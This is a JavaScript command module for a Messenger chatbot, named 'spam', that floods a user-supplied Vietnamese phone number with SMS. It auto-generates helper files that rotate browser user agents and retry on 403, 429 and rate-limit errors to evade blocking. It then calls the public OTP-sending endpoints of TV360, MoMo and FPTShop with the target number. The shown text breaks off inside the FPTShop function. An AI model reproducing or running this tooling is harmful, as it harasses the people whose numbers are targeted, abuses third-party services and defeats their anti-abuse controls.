module.exports.config = {
    name: "spam",
    version: "2.0.0",
    hasPermssion: 2,
    credits: "Nguy·ªÖn Tr∆∞∆°ng Thi·ªán Ph√°t (pcoder)",
    description: "Spam SMS to phone numbers (Vietnam only)",
    commandCategory: "H·ªá th·ªëng",
    usages: "spam [phone] [seconds] | spam apis",
    cooldowns: 5,
    dependencies: {
        "axios": "",
        "request": "",
        "request-promise": ""
    },
    info: [
        {
            key: 'spam [phone]',
            prompt: 'Spam SMS to the provided phone number (Vietnam only)',
            type: 'SMS spam',
            example: 'spam 0987654321 60'
        },
        {
            key: 'spam apis',
            prompt: 'Show list of available SMS APIs',
            type: 'List APIs',
            example: 'spam apis'
        }
    ]
};

// Import required modules
const axios = require('axios');
const request = require('request-promise');
const fs = require('fs');
const path = require('path');

// Path constants
const userAgentDirPath = path.join(__dirname, '../utils');
const userAgentsPath = path.join(userAgentDirPath, 'userAgents.js');
const apiProxyPath = path.join(userAgentDirPath, 'apiProxy.js');
const userAgentManagerPath = path.join(userAgentDirPath, 'userAgentManager.js');

// Ensure utils directory exists
if (!fs.existsSync(userAgentDirPath)) {
    fs.mkdirSync(userAgentDirPath, { recursive: true });
    console.log('[SPAM] Created utils directory automatically');
}

// Function to check for and create missing modules
function ensureModuleExists() {
    // Check and create userAgents.js if needed
    if (!fs.existsSync(userAgentsPath)) {
        const userAgentsCode = `/**
 * User Agents Generator Module
 * Auto-generated by spam.js to prevent errors
 * 
 * This module provides a list of user agents to avoid API blocking
 * Created by: Nguy·ªÖn Tr∆∞∆°ng Thi·ªán Ph√°t (pcoder)
 */

// List of user agents (full version)
const userAgents = [
    // Windows browsers
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    
    // macOS browsers
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    
    // Linux browsers
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0',
    
    // iOS browsers
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/113.0.1774.50 Version/13.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.0 Mobile/15E148 Safari/605.1.15',
    
    // Android browsers
    'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Android 13; Mobile; rv:107.0) Gecko/107.0 Firefox/107.0',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    
    // Bots and others
    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/108.0.5359.71 Safari/537.36',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'
];

// Function to get a random user agent from the list
function getRandomUserAgent() {
    const randomIndex = Math.floor(Math.random() * userAgents.length);
    return userAgents[randomIndex];
}

// Function to get all user agents (for statistics)
function getAllUserAgents() {
    return [...userAgents];
}

// Function to refresh the user agent pool if needed
function refreshUserAgentPool() {
    // Implementation for refreshing could be added later
    return getAllUserAgents().length;
}

// Export the functions
module.exports = {
    getRandomUserAgent,
    getAllUserAgents,
    refreshUserAgentPool
};`;
        
        fs.writeFileSync(userAgentsPath, userAgentsCode);
        console.log('[SPAM] Created userAgents.js module automatically');
    }
    
    // Check and create apiProxy.js if needed
    if (!fs.existsSync(apiProxyPath)) {
        const apiProxyCode = `/**
 * API Proxy v√† Anti-Block Module
 * Module n√†y gi√∫p tr√°nh b·ªã block khi g·ªçi API li√™n t·ª•c
 * Created by: Nguy·ªÖn Tr∆∞∆°ng Thi·ªán Ph√°t (pcoder)
 * Auto-generated by spam.js
 * 
 * C√°ch s·ª≠ d·ª•ng:
 * const { sendRequest, setRequestOptions } = require('../utils/apiProxy');
 * 
 * // G·ª≠i request v·ªõi user agent ng·∫´u nhi√™n
 * const response = await sendRequest('https://api.example.com/data');
 * 
 * // Ho·∫∑c t√πy ch·ªânh options
 * const options = {
 *    headers: { 'Custom-Header': 'value' },
 *    timeout: 10000,
 *    retries: 3
 * };
 * const response = await sendRequest('https://api.example.com/data', options);
 */

const https = require('https');
const http = require('http');
const url = require('url');
const { getRandomUserAgent, refreshUserAgentPool } = require('./userAgents');

// Danh s√°ch proxy n·∫øu c·∫ßn (c√≥ th·ªÉ ƒë·ªÉ tr·ªëng n·∫øu kh√¥ng d√πng proxy)
const proxies = [
    // Format: { host: 'proxy.example.com', port: 8080, auth: 'username:password' }
    // N·∫øu c√≥ proxy, h√£y th√™m v√†o ƒë√¢y
];

// C·∫•u h√¨nh m·∫∑c ƒë·ªãnh
const defaultOptions = {
    timeout: 30000, // 30 gi√¢y
    retries: 3,     // S·ªë l·∫ßn th·ª≠ l·∫°i khi request th·∫•t b·∫°i
    retryDelay: 1000, // ƒê·ªô tr·ªÖ gi·ªØa c√°c l·∫ßn th·ª≠ l·∫°i (ms)
    useProxy: false,  // M·∫∑c ƒë·ªãnh kh√¥ng d√πng proxy
    rotateUserAgent: true, // Lu√¥n thay ƒë·ªïi user agent
    headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    }
};

let currentOptions = { ...defaultOptions };

/**
 * C√†i ƒë·∫∑t t√πy ch·ªçn m·ªõi cho API request
 * @param {Object} options - C√°c t√πy ch·ªçn m·ªõi
 */
function setRequestOptions(options) {
    currentOptions = { ...defaultOptions, ...options };
    return currentOptions;
}

/**
 * L·∫•y m·ªôt proxy ng·∫´u nhi√™n t·ª´ danh s√°ch
 * @returns {Object|null} - Th√¥ng tin proxy ho·∫∑c null n·∫øu kh√¥ng c√≥
 */
function getRandomProxy() {
    if (!proxies.length) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

/**
 * Th·ª±c hi·ªán HTTP request v·ªõi c√°c bi·ªán ph√°p tr√°nh b·ªã block
 * @param {string} requestUrl - URL c·∫ßn g·ªçi
 * @param {Object} options - T√πy ch·ªçn cho request
 * @returns {Promise<Object>} - Promise ch·ª©a response
 */
async function sendRequest(requestUrl, options = {}) {
    // K·∫øt h·ª£p t√πy ch·ªçn m·∫∑c ƒë·ªãnh v√† t√πy ch·ªçn ng∆∞·ªùi d√πng
    const requestOptions = { ...currentOptions, ...options };
    
    // Th·ª≠ l·∫°i n·∫øu c√≥ l·ªói
    let lastError = null;
    for (let attempt = 0; attempt < requestOptions.retries; attempt++) {
        try {
            // N·∫øu kh√¥ng ph·∫£i l·∫ßn th·ª≠ ƒë·∫ßu ti√™n, ƒë·ª£i m·ªôt kho·∫£ng th·ªùi gian
            if (attempt > 0) {
                await new Promise(resolve => setTimeout(resolve, requestOptions.retryDelay));
            }
            
            // L·∫•y user agent ng·∫´u nhi√™n n·∫øu ƒë∆∞·ª£c y√™u c·∫ßu
            if (requestOptions.rotateUserAgent) {
                requestOptions.headers = {
                    ...requestOptions.headers,
                    'User-Agent': getRandomUserAgent()
                };
            }
            
            // L·∫•y proxy n·∫øu ƒë∆∞·ª£c y√™u c·∫ßu
            let proxyConfig = null;
            if (requestOptions.useProxy && proxies.length > 0) {
                proxyConfig = getRandomProxy();
            }
            
            // Th·ª±c hi·ªán request
            const response = await makeRequest(requestUrl, requestOptions, proxyConfig);
            return response;
        } catch (error) {
            lastError = error;
            
            // N·∫øu l·ªói l√† do b·ªã ch·∫∑n (status 403, 429, v.v.), ƒë·ªïi user agent v√† proxy
            if (error.statusCode === 403 || error.statusCode === 429) {
                // ƒê·ªïi user agent v√† th·ª≠ l·∫°i
                if (requestOptions.rotateUserAgent) {
                    requestOptions.headers['User-Agent'] = getRandomUserAgent();
                }
                
                // TƒÉng th·ªùi gian ch·ªù gi·ªØa c√°c request
                await new Promise(resolve => setTimeout(resolve, requestOptions.retryDelay * 2));
            }
        }
    }
    
    // N·∫øu t·∫•t c·∫£ c√°c l·∫ßn th·ª≠ ƒë·ªÅu th·∫•t b·∫°i, n√©m l·ªói cu·ªëi c√πng
    throw lastError || new Error('Request failed after multiple attempts');
}

/**
 * Th·ª±c hi·ªán HTTP request
 * @param {string} requestUrl - URL c·∫ßn g·ªçi
 * @param {Object} options - T√πy ch·ªçn cho request
 * @param {Object|null} proxy - Th√¥ng tin proxy
 * @returns {Promise<Object>} - Promise ch·ª©a response
 */
function makeRequest(requestUrl, options, proxy = null) {
    return new Promise((resolve, reject) => {
        // Parse URL ƒë·ªÉ l·∫•y th√¥ng tin protocol, hostname, path
        const parsedUrl = url.parse(requestUrl);
        
        // X√°c ƒë·ªãnh module HTTP/HTTPS d·ª±a v√†o protocol
        const httpModule = parsedUrl.protocol === 'https:' ? https : http;
        
        // Chu·∫©n b·ªã t√πy ch·ªçn cho request
        const requestOptions = {
            method: options.method || 'GET',
            headers: options.headers || {},
            timeout: options.timeout || 30000
        };
        
        // Th√™m th√¥ng tin proxy n·∫øu c√≥
        if (proxy) {
            requestOptions.host = proxy.host;
            requestOptions.port = proxy.port;
            requestOptions.path = requestUrl; // D√πng URL ƒë·∫ßy ƒë·ªß khi d√πng proxy
            
            // Th√™m x√°c th·ª±c proxy n·∫øu c√≥
            if (proxy.auth) {
                requestOptions.headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxy.auth).toString('base64');
            }
        } else {
            requestOptions.host = parsedUrl.hostname;
            requestOptions.port = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
            requestOptions.path = parsedUrl.path;
        }
        
        // Th·ª±c hi·ªán request
        const req = httpModule.request(requestOptions, (res) => {
            let data = '';
            
            // Nh·∫≠n d·ªØ li·ªáu
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            // Ho√†n th√†nh
            res.on('end', () => {
                // X·ª≠ l√Ω c√°c m√£ tr·∫°ng th√°i kh√°c nhau
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    try {
                        // Th·ª≠ ph√¢n t√≠ch JSON
                        const contentType = res.headers['content-type'] || '';
                        if (contentType.includes('application/json')) {
                            resolve({
                                statusCode: res.statusCode,
                                headers: res.headers,
                                body: JSON.parse(data),
                                rawBody: data
                            });
                        } else {
                            // Kh√¥ng ph·∫£i JSON, tr·∫£ v·ªÅ d·∫°ng text
                            resolve({
                                statusCode: res.statusCode,
                                headers: res.headers,
                                body: data,
                                rawBody: data
                            });
                        }
                    } catch (error) {
                        // L·ªói khi ph√¢n t√≠ch JSON
                        resolve({
                            statusCode: res.statusCode,
                            headers: res.headers,
                            body: data,
                            rawBody: data,
                            error: 'JSON parse error'
                        });
                    }
                } else {
                    // L·ªói HTTP
                    const error = new Error(\`HTTP Error \${res.statusCode}: \${data}\`);
                    error.statusCode = res.statusCode;
                    error.headers = res.headers;
                    error.body = data;
                    reject(error);
                }
            });
        });
        
        // X·ª≠ l√Ω l·ªói
        req.on('error', (error) => {
            reject(error);
        });
        
        // X·ª≠ l√Ω timeout
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timed out'));
        });
        
        // Th√™m d·ªØ li·ªáu n·∫øu l√† POST, PUT, PATCH
        if (options.body && ['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
            const body = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
            
            // T·ª± ƒë·ªông th√™m content-type n·∫øu kh√¥ng c√≥
            if (!requestOptions.headers['content-type']) {
                requestOptions.headers['content-type'] = 'application/json';
            }
            
            req.write(body);
        }
        
        // K·∫øt th√∫c request
        req.end();
    });
}

// C·∫≠p nh·∫≠t user agent pool m·ªói 6 gi·ªù
setInterval(() => {
    refreshUserAgentPool();
}, 6 * 60 * 60 * 1000);

module.exports = {
    sendRequest,
    setRequestOptions
};`;
        
        fs.writeFileSync(apiProxyPath, apiProxyCode);
        console.log('[SPAM] Created apiProxy.js module automatically');
    }
    
    // Check and create userAgentManager.js if needed
    if (!fs.existsSync(userAgentManagerPath)) {
        const userAgentManagerCode = `/**
 * User Agent Manager - Qu·∫£n l√Ω t·ª± ƒë·ªông user agent
 * Cung c·∫•p c√°c h√†m ƒë·ªÉ qu·∫£n l√Ω user agent t·ª± ƒë·ªông, l∆∞u cache, v√† tr√°nh b·ªã block API
 * Created by: Nguy·ªÖn Tr∆∞∆°ng Thi·ªán Ph√°t (pcoder)
 * Auto-generated by spam.js
 * 
 * C√°ch s·ª≠ d·ª•ng:
 * const { attachUserAgentToApi } = require('../utils/userAgentManager');
 * 
 * // √Åp d·ª•ng user agent v√†o API
 * attachUserAgentToApi(api);
 * 
 * // Sau khi √°p d·ª•ng, m·ªçi request qua api s·∫Ω t·ª± ƒë·ªông ƒë∆∞·ª£c g·∫Øn user agent kh√°c nhau
 */

const { getRandomUserAgent, refreshUserAgentPool } = require('./userAgents');

// L∆∞u cache c√°c API ƒë√£ ƒë∆∞·ª£c √°p d·ª•ng user agent
const attachedApis = new WeakMap();

// T·ª∑ l·ªá thay ƒë·ªïi user agent (0.0 - 1.0)
// 1.0 = ƒë·ªïi user agent m·ªói request
// 0.5 = ƒë·ªïi user agent 50% s·ªë request
const AGENT_CHANGE_RATIO = 1.0;

/**
 * √Åp d·ª•ng user agent v√†o t·∫•t c·∫£ c√°c ph∆∞∆°ng th·ª©c API c·ªßa Facebook
 * @param {Object} api - API object t·ª´ Facebook-api
 * @returns {Object} - API object ƒë√£ ƒë∆∞·ª£c √°p d·ª•ng user agent
 */
function attachUserAgentToApi(api) {
    // N·∫øu ƒë√£ √°p d·ª•ng r·ªìi th√¨ b·ªè qua
    if (attachedApis.has(api)) {
        return api;
    }
    
    // Danh s√°ch c√°c ph∆∞∆°ng th·ª©c c·∫ßn √°p d·ª•ng user agent
    const methodsToAttach = [
        'sendMessage',
        'getUserInfo',
        'getThreadInfo',
        'getThreadList',
        'searchThreads',
        'getThreadHistory',
        'markAsRead',
        'markAsDelivered',
        'setMessageReaction',
        'addUserToGroup',
        'removeUserFromGroup',
        'changeThreadEmoji',
        'changeThreadColor',
        'changeNickname',
        'handleMessageRequest',
        'getThreadPictures',
        'forwardAttachment',
        'setPostReaction',
        'createNewGroup',
        'changeGroupImage',
        'changeAdminStatus',
        'changeApprovalMode',
        'setTitle',
        'muteThread',
        'unmuteThread',
        'deleteMessage',
        'deleteThread',
        'searchForThread',
        'unfriend'
    ];
    
    // Wrap c√°c ph∆∞∆°ng th·ª©c API v·ªõi user agent t·ª± ƒë·ªông
    for (const methodName of methodsToAttach) {
        if (typeof api[methodName] === 'function') {
            const originalMethod = api[methodName];
            
            // Thay th·∫ø ph∆∞∆°ng th·ª©c g·ªëc b·∫±ng ph∆∞∆°ng th·ª©c c√≥ user agent
            api[methodName] = async function(...args) {
                try {
                    // Ki·ªÉm tra xem c√≥ tham s·ªë options kh√¥ng
                    const lastArg = args[args.length - 1];
                    const hasOptions = lastArg && typeof lastArg === 'object' && !Array.isArray(lastArg);
                    
                    // T·∫°o user agent ng·∫´u nhi√™n
                    if (Math.random() <= AGENT_CHANGE_RATIO) {
                        const userAgent = getRandomUserAgent();
                        
                        // N·∫øu c√≥ options, th√™m user agent v√†o options
                        if (hasOptions && !args[args.length - 1].userAgent) {
                            args[args.length - 1].userAgent = userAgent;
                        } 
                        // N·∫øu kh√¥ng c√≥ options, th√™m options v·ªõi user agent
                        else if (!hasOptions) {
                            if (methodName === 'sendMessage' && args.length >= 3) {
                                // sendMessage c√≥ c·∫•u tr√∫c (message, threadID, messageID, options)
                                args.push({ userAgent });
                            } else {
                                // C√°c ph∆∞∆°ng th·ª©c kh√°c, th√™m options v√†o cu·ªëi
                                args.push({ userAgent });
                            }
                        }
                    }
                    
                    // G·ªçi ph∆∞∆°ng th·ª©c g·ªëc v·ªõi c√°c tham s·ªë ƒë√£ ƒë∆∞·ª£c th√™m user agent
                    return await originalMethod.apply(this, args);
                } catch (error) {
                    // X·ª≠ l√Ω l·ªói khi API b·ªã block
                    if (error && (error.message.includes('block') || 
                                error.message.includes('limit') || 
                                error.message.includes('spam') ||
                                error.message.includes('temporarily') ||
                                error.message.includes('rate'))) {
                        console.error(\`[API Block Detected] \${methodName}: \${error.message}\`);
                        // Th·ª≠ l·∫°i v·ªõi user agent kh√°c
                        try {
                            // ƒê·ª£i m·ªôt kho·∫£ng th·ªùi gian ng·∫Øn tr∆∞·ªõc khi th·ª≠ l·∫°i
                            await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
                            
                            // T·∫°o user agent m·ªõi v√† th·ª≠ l·∫°i
                            const userAgent = getRandomUserAgent();
                            const lastIndex = args.length - 1;
                            
                            if (hasOptions) {
                                args[lastIndex].userAgent = userAgent;
                            } else {
                                if (methodName === 'sendMessage' && args.length >= 3) {
                                    args.push({ userAgent });
                                } else {
                                    args.push({ userAgent });
                                }
                            }
                            
                            return await originalMethod.apply(this, args);
                        } catch (retryError) {
                            // N·∫øu th·ª≠ l·∫°i v·∫´n l·ªói, n√©m l·ªói ban ƒë·∫ßu
                            throw error;
                        }
                    } else {
                        // N·∫øu kh√¥ng ph·∫£i l·ªói API block, n√©m l·ªói ban ƒë·∫ßu
                        throw error;
                    }
                }
            };
        }
    }
    
    // ƒê√°nh d·∫•u API ƒë√£ ƒë∆∞·ª£c √°p d·ª•ng
    attachedApis.set(api, true);
    
    // Thi·∫øt l·∫≠p t·ª± ƒë·ªông l√†m m·ªõi danh s√°ch user agent
    setupAutoRefresh();
    
    return api;
}

/**
 * Thi·∫øt l·∫≠p t·ª± ƒë·ªông l√†m m·ªõi user agent ƒë·ªãnh k·ª≥
 */
function setupAutoRefresh() {
    // L√†m m·ªõi user agent pool m·ªói 6 gi·ªù
    const refreshInterval = 6 * 60 * 60 * 1000; // 6 gi·ªù
    
    // N·∫øu ch∆∞a c√≥ interval, t·∫°o m·ªõi
    if (!global.userAgentRefreshInterval) {
        global.userAgentRefreshInterval = setInterval(() => {
            console.log('[User Agent] Refreshing user agent pool...');
            refreshUserAgentPool();
        }, refreshInterval);
    }
}

module.exports = {
    attachUserAgentToApi
};`;
        
        fs.writeFileSync(userAgentManagerPath, userAgentManagerCode);
        console.log('[SPAM] Created userAgentManager.js module automatically');
    }
}

// Create or check for all required modules
ensureModuleExists();

// Create getRandomUserAgent reference for use in this file
let getRandomUserAgent;
try {
    const userAgents = require('../utils/userAgents');
    getRandomUserAgent = userAgents.getRandomUserAgent;
} catch (error) {
    console.error('[SPAM] Failed to load userAgents module:', error.message);
    
    // Fallback implementation in case module loading fails
    getRandomUserAgent = function() {
        const defaultUserAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
        ];
        return defaultUserAgents[Math.floor(Math.random() * defaultUserAgents.length)];
    };
}

// SMS Spam APIs (converted from Python)
const smsApis = {
    // Array of API functions to send SMS
    apis: [],
    
    // Method to register all APIs
    init() {
        
        // TV360 API
        this.apis.push(async function tv360(phone) {
            try {
                const userAgent = getRandomUserAgent();
                console.log(`[SPAM-TV360] Sending request for phone ${phone}`);
                
                const data = JSON.stringify({ msisdn: phone });
                const headers = {
                    "Host": "m.tv360.vn",
                    "accept": "application/json, text/plain, */*",
                    "user-agent": userAgent,
                    "content-type": "application/json"
                };
                
                const response = await axios.post(
                    "https://m.tv360.vn/public/v1/auth/get-otp-login", 
                    data, 
                    { headers, timeout: 10000 }
                );
                
                console.log(`[SPAM-TV360] Response status: ${response.status}`);
                return {
                    success: response.status === 200,
                    api: 'tv360',
                    userAgent: userAgent
                };
            } catch (error) {
                console.log('[SPAM-TV360] Error:', error.message);
                return {
                    success: false,
                    api: 'tv360',
                    error: error.message
                };
            }
        });
        
        // MOMO API
        this.apis.push(async function momo(phone) {
            try {
                const userAgent = getRandomUserAgent();
                console.log(`[SPAM-MOMO] Sending request for phone ${phone}`);
                
                const headers = {
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json;charset=UTF-8',
                    'User-Agent': userAgent,
                    'Origin': 'https://momo.vn'
                };
                
                const data = {
                    'deviceOS': 'Web',
                    'phoneNumber': phone,
                    'riskInfos': {
                        'buildNumber': 0,
                        'networkType': 'UNKNOWN'
                    },
                    'appVer': 30266,
                    'appCode': '3.0.26',
                    'lng': 'vi',
                    'channel': 'APP',
                    'cmdId': `${Date.now()}`
                };
                
                const response = await axios.post(
                    'https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG', 
                    data, 
                    { headers, timeout: 10000 }
                );
                
                console.log(`[SPAM-MOMO] Response status: ${response.status}`);
                return {
                    success: response.status === 200,
                    api: 'momo',
                    userAgent: userAgent
                };
            } catch (error) {
                console.log('[SPAM-MOMO] Error:', error.message);
                return {
                    success: false,
                    api: 'momo',
                    error: error.message
                };
            }
        });
        
        // FPTSHOP API
        this.apis.push(async function fptshop(phone) {
            try {
                const userAgent = getRandomUserAgent();
                console.log(`[SPAM-FPTSHOP] Sending request for phone ${phone}`);
                
                const response = await axios.post('https://fptshop.com.vn/api-data/loyalty/Home/Verification', {
                    "phoneNumber": phone,
                    "type": 1
                }, {
                    headers: {
                        'User-Agent': userAgent,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
